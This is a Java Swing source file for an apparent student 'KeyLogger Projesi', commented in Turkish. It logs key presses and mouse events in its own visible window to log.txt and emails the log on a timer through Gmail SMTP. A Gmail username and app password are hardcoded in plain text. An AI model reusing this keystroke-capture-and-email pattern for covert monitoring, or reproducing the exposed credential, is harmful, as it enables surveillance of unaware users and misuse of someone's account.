import javax.mail.*;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.internet.MimeMultipart;
import java.awt.geom.RoundRectangle2D;
import java.io.*;
import java.util.Properties;
import java.util.Timer;
import java.util.TimerTask;
import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
public class Main {
    public static void main(String[] args) {
        //Dosya classından dosyaOlusturma  methodu çalışıyor
        Dosya nesnem=new Dosya();
        nesnem.dosyaOlusturma();

        //Arayüz constructorı çalışıyor
        Arayuz guiWindow = new Arayuz();
    }
}
class Tasarim {
    //önplan(yazılar ve butonların rengi
    Color foreground = Color.decode("#CBCE91");
    //arkaplan rengi
    Color background = Color.decode("#d3687f");
    Font newFont = new Font("Arial", Font.BOLD+Font.ITALIC, 16);
    //isaretlenmemiş checkbox tasarımı
    Icon checkbox = new Icon() {
        private final int width = 20;
        private final int height = 20;
        private final int arcSize = 10;

        public void paintIcon(Component c, Graphics g, int x, int y) {
            Graphics2D g2d = (Graphics2D) g.create();
            g2d.setColor(foreground);
            g2d.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
            g2d.fill(new RoundRectangle2D.Double(x, y, width, height, arcSize, arcSize));
            g2d.dispose();
        }

        public int getIconWidth() {
            return width;
        }

        public int getIconHeight() {
            return height;
        }
    };
    //tik işaretli checkbox tasarımı
    Icon secilicheckbox = new Icon() {
        private final int width = 20;
        private final int height = 20;

        public void paintIcon(Component c, Graphics g, int x, int y) {
            Graphics2D g2d = (Graphics2D) g.create();
            g2d.setColor(foreground);
            g2d.setStroke(new BasicStroke(3));
            g2d.drawLine(x + 5, y + height / 2, x + width / 2, y + height - 5);
            g2d.drawLine(x + width / 2, y + height - 5, x + width - 5, y + 5);
            g2d.dispose();
        }

        public int getIconWidth() {
            return width;
        }

        public int getIconHeight() {
            return height;
        }
    };
    //kenarları yuvarlak buton tasarımı
    class Buton extends JButton {
        private static final int arcSize = 30;
        public Buton(String text) {
            super(text);
            this.setFont(newFont);
            setBorderPainted(false);
            setContentAreaFilled(false);
        }

        @Override
        protected void paintComponent(Graphics g) {
            Graphics2D g2d = (Graphics2D) g.create();
            g2d.setColor(foreground);
            g2d.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
            g2d.fillRoundRect(0, 0, getWidth(), getHeight(), arcSize, arcSize);
            g2d.setColor(background);
            g2d.drawString(getText(), getWidth() / 2 - g2d.getFontMetrics().stringWidth(getText()) / 2,
                    getHeight() / 2 + g2d.getFontMetrics().getAscent() / 2);
            g2d.dispose();
        }
    }

    public void cbDetaylar(JCheckBox cb){
        cb.setOpaque(false);
        cb.setIcon(checkbox);
        cb.setSelectedIcon(secilicheckbox);
    }
    public void txtDetaylar(JTextField txt){
        txt.setBackground(foreground);
        txt.setForeground(background);
        txt.setBorder(null);
    }
    //textareaya tıklayınca default yazıyı siliyor
    public void txtBosaltma(JTextField txt){
        txt.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseClicked(MouseEvent e) {
                txt.setText("");
            }
        });
    }
    //tüm labelların rengini değiştiriliyor
    public void fontRengi(JLabel lbl){
        lbl.setForeground(foreground);
    }
}
class Arayuz extends Tasarim {
    private static boolean isTracking = false;//başlat-durdur butonlarının işe yaraması için bir kontrol değişkeni
    private static int secenek = 0;//hangi checkboxın işaretlendiğini gösteren değişken
    JFrame frame = new JFrame("KeyLogger Projesi");
    public Arayuz(){
        //guiyi kapatınca programı durduruyo yoksa arkaplanda çalışmaya devam ediyor
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setSize(800, 500);
        frame.setLocation(300,200);
        frame.setLayout(null);
        frame.getContentPane().setBackground(background);

        //labelların fontunu değiştirir
        UIManager.put("Label.font", newFont);
        //kullanıcıdan input aldığımız kısımlar

        //label oluşturup font rengini ve konumu ayarlandı
        //textfield oluşturulup txtDetaylar methoduyla border kaldırıldı renkler ayarlandı
        //default yazı ayarlandı ve txtBosaltma methoduyla alana tıklanınca default yazının silimesi sağlandı
        //ve konumu ayarlandı


        JLabel lblMailAralik=new JLabel("Mail gönderme aralıkları(dk):");
        fontRengi(lblMailAralik);
        lblMailAralik.setBounds(50, 30, 215, 20);
        JTextField txtMailAralik=new JTextField(40);
        txtDetaylar(txtMailAralik);
        txtMailAralik.setText("1");
        txtBosaltma(txtMailAralik);
        txtMailAralik.setBounds(280, 30, 120, 25);

        JLabel lblEmail=new JLabel("Gönderilecek mail hesabı:");
        fontRengi(lblEmail);
        lblEmail.setBounds(50, 70, 215, 20);
        JTextField txtEmail=new JTextField(40);
        txtDetaylar(txtEmail);
        txtEmail.setText("ornek@gmail.com");
        txtBosaltma(txtEmail);
        txtEmail.setBounds(280, 70, 120, 25);

        JLabel lblDosyaBoyutu=new JLabel("Maximum dosya boyutu(mb):");
        fontRengi(lblDosyaBoyutu);
        lblDosyaBoyutu.setBounds(50, 110, 225, 20);
        JTextField txtDosyaBoyutu=new JTextField(40);
        txtDetaylar(txtDosyaBoyutu);
        txtDosyaBoyutu.setText("1");
        txtBosaltma(txtDosyaBoyutu);
        txtDosyaBoyutu.setBounds(280, 110, 120, 25);

        //checkbox oluşturuldu konumu ayarlandı
        //label oluşturuldu rengi ve konumu ayarlandı
        //cbdetaylar ile checkbox tasarımı ayarlandı

        JCheckBox checkBoxFare = new JCheckBox();
        checkBoxFare.setBounds(430, 30, 30, 25);
        JLabel lblFare=new JLabel("Sadece fare hareketleri");
        fontRengi(lblFare);
        lblFare.setBounds(470, 30, 200, 25);
        cbDetaylar(checkBoxFare);

        JCheckBox checkBoxKlavye = new JCheckBox();
        checkBoxKlavye.setBounds(430, 70, 30, 25);
        JLabel lblKlavye=new JLabel("Sadece klavye hareketleri");
        fontRengi(lblKlavye);
        lblKlavye.setBounds(470, 70, 200, 25);
        cbDetaylar(checkBoxKlavye);

        JCheckBox checkBoxFareVeKlavye = new JCheckBox();
        checkBoxFareVeKlavye.setBounds(430, 110, 30, 25);
        JLabel lblFareVeKlavye=new JLabel("Her ikisi");
        fontRengi(lblFareVeKlavye);
        lblFareVeKlavye.setBounds(470, 110, 200, 25);
        cbDetaylar(checkBoxFareVeKlavye);

        //aynı anda tek seçim yapılabilmesi için butonlar gruplandı
        ButtonGroup grup = new ButtonGroup();
        grup.add(checkBoxFare);
        grup.add(checkBoxKlavye);
        grup.add(checkBoxFareVeKlavye);

        //işaretlenen checkboxa göre seçenek değişkeni atandı
        ActionListener actionListener = new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                JCheckBox selectedButton = (JCheckBox) e.getSource();
                if (selectedButton.isSelected()) {
                    if (selectedButton == checkBoxFare) {
                        secenek=1;
                    } else if (selectedButton == checkBoxKlavye) {
                        secenek=2;
                    } else if (selectedButton == checkBoxFareVeKlavye) {
                        secenek=3;
                    }
                }
            }
        };
        checkBoxFare.addActionListener(actionListener);
        checkBoxKlavye.addActionListener(actionListener);
        checkBoxFareVeKlavye.addActionListener(actionListener);

        //durdur ve başlat butonları oluşturuldu
        Buton btnDurdur = new Buton("durdur");
        btnDurdur.setBounds(300, 170,100,30);

        Buton btnBaslat = new Buton("başlat");
        btnBaslat.setBounds(430, 170,100,30);

        //mouse ve klavye hareketini dinlemek için hareketler nesnesi oluşturuldu
        Hareketler hareketler = new Hareketler();

        btnBaslat.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                //textfieldlara girilen inputar alınıyor eğer bir değer girilmemişse default değer atıyor
                String mailAralik;
                String aliciEmail;
                String maxBoyut;

                mailAralik= txtMailAralik.getText();
                if (mailAralik.isEmpty()){
                    mailAralik="1";
                }

                aliciEmail= txtEmail.getText();
                if (aliciEmail.isEmpty()){
                    aliciEmail="ilaydatiryaki25@gmail.com";
                }

                maxBoyut= txtDosyaBoyutu.getText();
                if (maxBoyut.isEmpty()){
                    maxBoyut="1";
                }
                int boyut= Integer.parseInt(maxBoyut);

                //google mail en fazla 25 mb dosya boyutu kabul ettiği için 25 üzeri değerlerde uyarı veriyor
                if(boyut>=25){
                    JOptionPane.showMessageDialog(null, "maximum 25 mb kullanılabilir");
                    txtDosyaBoyutu.setText("");
                }else{
                //checkboxlardan aldığımız seçenek değişkenine göre işlem yapıyoruz
                switch (secenek){
                    case 0:
                        JOptionPane.showMessageDialog(null,"lütfen bir seçenek seçiniz");
                        break;
                    case 1:
                        hareketler.addMouseListeners(isTracking,frame, boyut);
                        isTracking = true;
                        break;
                    case 2:
                        hareketler.addKeyListeners(isTracking,frame, boyut);
                        isTracking = true;
                        break;
                    case 3:
                        hareketler.addMouseListeners(isTracking,frame, boyut);
                        hareketler.addKeyListeners(isTracking,frame, boyut);
                        isTracking = true;
                        break;
                    default:
                        JOptionPane.showMessageDialog(null,"hatalı işlem yaptınız");
                }
                //listenerların çalışmasına göre buton yazıları değişiyor
                if(isTracking){
                    btnBaslat.setText("basladi");
                    btnDurdur.setText("durdur");
                }else{
                    btnBaslat.setText("baslat");
                    btnDurdur.setText("durdu");
                }

                //verilen bilgilere göre mail gönderiyoruz
                MailGonderme nesne = new MailGonderme();
                nesne.mailZamanlayici(Integer.parseInt(mailAralik), aliciEmail);
                }
            }
        });

        btnDurdur.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                JOptionPane.showMessageDialog(null,"işlem durduruluyor");
                hareketler.removeListeners(isTracking,frame);
                isTracking = false;

                btnBaslat.setText("baslat");
                btnDurdur.setText("durdu");
            }
        });

        //üyeler framee ekleniliyor
        frame.add(lblMailAralik);
        frame.add(txtMailAralik);
        frame.add(lblEmail);
        frame.add(txtEmail);
        frame.add(lblDosyaBoyutu);
        frame.add(txtDosyaBoyutu);

        frame.add(checkBoxFare);
        frame.add(lblFare);
        frame.add(checkBoxKlavye);
        frame.add(lblKlavye);
        frame.add(checkBoxFareVeKlavye);
        frame.add(lblFareVeKlavye);

        frame.add(btnDurdur);
        frame.add(btnBaslat);

        frame.setVisible(true);
    }
}
class Hareketler{
    //klavye ve mouse hareketlerini kontrol eden class
    private static MouseMotionAdapter mouseMotionAdapter;
    private static MouseAdapter mouseAdapter;
    private static KeyListener keyListener;
    Dosya d = new Dosya();
    public void addMouseListeners(boolean isTracking, JFrame frame, int boyut) {
        if (!isTracking) {//arayüz classında işlemin çalışıp çalışmamasına göre değişen kontrol değişkeni
            mouseMotionAdapter = new MouseMotionAdapter() {
                //imlecin konumunu yazdıran method
                public void mouseMoved(MouseEvent e) {
                    int x = e.getX();
                    int y = e.getY();
                    System.out.println("Fare Hareket Etti: x = " + x + ", y = " + y);
                    d.dosyaYazma("Fare Hareket Etti: x = " + x + ", y = " + y, boyut);
                }
            };
            frame.addMouseMotionListener(mouseMotionAdapter);

            mouseAdapter = new MouseAdapter() {
                //farenin tıklandığı yerdeki konumu yazdıran method
                public void mousePressed(MouseEvent e) {
                    int x = e.getX();
                    int y = e.getY();
                    System.out.println("Fareye Tıklandı: x = " + x + ", y = " + y);
                    d.dosyaYazma("Fareye Tıklandı: x = " + x + ", y = " + y, boyut);
                }
            };
            frame.addMouseListener(mouseAdapter);
        }
    }
    public void addKeyListeners(boolean isTracking, JFrame frame, int boyut){
        if (!isTracking) {
            keyListener = new KeyAdapter() {
                //klavyeden tıklanan tuşu yazan method
                public void keyPressed(KeyEvent e) {
                    char keyChar = e.getKeyChar();
                    int keyCode = e.getKeyCode();
                    System.out.println("Tuş Basıldı: " + keyChar + " (Kod: " + keyCode + ")");
                    d.dosyaYazma("Tuş Basıldı: " + keyChar + " (Kod: " + keyCode + ")", boyut);
                }
            };

            frame.addKeyListener(keyListener);
            frame.setFocusable(true);
            frame.requestFocus();
        }
    }
    public void removeListeners(boolean isTracking, JFrame frame) {
        if (isTracking) {
            //durdur butonuna tıklandığında işlem durmasını sağlıyor
            frame.removeMouseMotionListener(mouseMotionAdapter);
            frame.removeMouseListener(mouseAdapter);
            frame.removeKeyListener(keyListener);
        }
    }
}
class Dosya{
    public String dosyaYolu="log.txt";
    public void dosyaOlusturma(){
        //dosya yoksa oluşturup  varsa içeriğini boşaltıp yeni bir log dosyası diye başlık atıyor
        String logMetni = "Yeni bir log dosyası";

        try {
            FileWriter fileWriter = new FileWriter(dosyaYolu, false);
            PrintWriter printWriter = new PrintWriter(fileWriter);

            printWriter.println(logMetni);

            printWriter.close();
            System.out.println("Log dosyası oluşturuldu ve içine yazıldı.");
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
    public void dosyaYazma(String hareketler, int boyut){
        //var olan dosyaya parametre olarak aldığı hareketler stringini ekleme yapıyor
        try (FileWriter writer = new FileWriter(dosyaYolu, true)) {
            File file = new File(dosyaYolu);
            long boyutBytes = file.length();
            long boyutKB = boyutBytes / 1024;
            long boyutMB = boyutKB / 1024;

            //dosya parametre olarak giren boyuttan büyükse dosyayı sıfırlıyor
            if(boyutMB>boyut)
                dosyaOlusturma();
            else{
                writer.write(hareketler);
                writer.write(System.lineSeparator());
                writer.flush();
            }

        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
class MailGonderme {
    private Timer zamanlayici;
    //arayüzden alınan aralık değerine göre o dakikada bir mail gönderiyor
    public void mailZamanlayici(int dakika, String to) {
        zamanlayici = new Timer();
        zamanlayici.schedule(new TimerTask() {
            @Override
            public void run() {
                mailGonderme(to);
            }
        }, 0, dakika * 60 * 1000); // 1 dakikada bir (5 * 60 * 1000 milisaniye)
    }
    private void mailGonderme(String to) {
        String from = "ilaydatiryaki25@gmail.com"; // Gönderen e-posta adresi
        String host = "smtp.gmail.com"; // SMTP sunucu adresi

        final String username = "ilaydatiryaki25@gmail.com"; // Gönderen e-posta hesabı kullanıcı adı
        final String password = "gutszhelinvdvwwg"; // Gönderen e-posta hesabı parolası

        // E-posta ayarlarının yapılandırılması
        Properties properties = new Properties();
        properties.put("mail.smtp.auth", "true");
        properties.put("mail.smtp.starttls.enable", "true");
        properties.put("mail.smtp.host", host);
        properties.put("mail.smtp.port", "587");

        // Oturum (Session) oluşturulması
        Session session = Session.getInstance(properties, new Authenticator() {
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(username, password);
            }
        });

        try {
            // E-posta oluşturulması
            MimeMessage message = new MimeMessage(session);
            message.setFrom(new InternetAddress(from));
            message.addRecipient(Message.RecipientType.TO, new InternetAddress(to));
            message.setSubject("Test E-postası");

            // E-posta içeriğinin oluşturulması
            BodyPart messageBodyPart = new MimeBodyPart();
            messageBodyPart.setText("Bu bir test e-postasıdır.");

            // Ek dosyanın oluşturulması
            File logFile = new File("log.txt");
            DataSource source = new FileDataSource(logFile);
            messageBodyPart.setDataHandler(new DataHandler(source));
            messageBodyPart.setFileName(logFile.getName());

            // Ek dosyanın eklenmesi
            Multipart multipart = new MimeMultipart();
            multipart.addBodyPart(messageBodyPart);

            // E-posta içeriğinin ayarlanması
            message.setContent(multipart);

            // E-postanın gönderilmesi
            Transport.send(message);

            System.out.println("E-posta gönderildi.");
        } catch (MessagingException e) {
            e.printStackTrace();
        }
    }
}
